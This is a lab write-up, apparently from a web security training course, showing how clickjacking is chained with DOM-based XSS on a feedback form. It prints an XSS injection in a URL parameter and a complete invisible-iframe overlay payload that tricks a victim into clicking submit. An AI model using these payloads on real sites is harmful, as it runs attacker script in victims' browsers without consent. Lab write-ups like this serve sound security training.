## Lab 04: Exploiting Clickjacking to Trigger DOM-Based XSS
 
**Technique:** Clickjacking chained with DOM-based XSS
**Target:** Submit feedback button (triggers XSS on click)
**Status:** Solved
 
### Context
 
This one is not about a direct account action. It demonstrates that clickjacking can be used to trigger any click-dependent event, including XSS payloads that only execute after a user interaction.
 
The feedback page was vulnerable to DOM-based XSS via the `name` parameter. The XSS payload got processed and executed when the submit button was clicked, not when the page loaded. This kind of click-triggered XSS cannot be exploited by just visiting a crafted URL. Clickjacking is exactly the right tool for it because you need the victim to physically click.
 
The XSS payload used here was:
 
```
<img src=1 onerror=print()>
```
 
This is injected into the `name` parameter in the URL. When the page loads inside the iframe, the input is already populated. When the victim clicks submit, the page processes the name field, the img tag fails to load, onerror fires, and `print()` executes.
 
### The Payload
 
```html
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}
 
div {
    position: absolute;
    top: 820px;
    left: 70px;
    z-index: 1;
}
</style>
 
<div>Click me</div>
 
<iframe src="https://LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=test@test.com&subject=test&message=test#feedbackResult"></iframe>
```
 
### Why This Works
 
The XSS payload is pre-loaded into the form via the URL parameters. The `#feedbackResult` at the end of the URL is a fragment that scrolls the page to the right position so the submit button is in a predictable location for overlay alignment.
 
Everything the form needs is already filled in. The victim just has to click. Clickjacking provides that click. XSS fires as a result.
 
This combination matters in real-world scenarios because self-XSS (XSS that only fires when you yourself interact with a specific form) is normally considered unexploitable. Clickjacking turns self-XSS into exploitable XSS by supplying the user interaction.
 
### Result
 
Victim clicked the decoy. Form submitted. XSS payload executed. `print()` called. Lab solved.
 
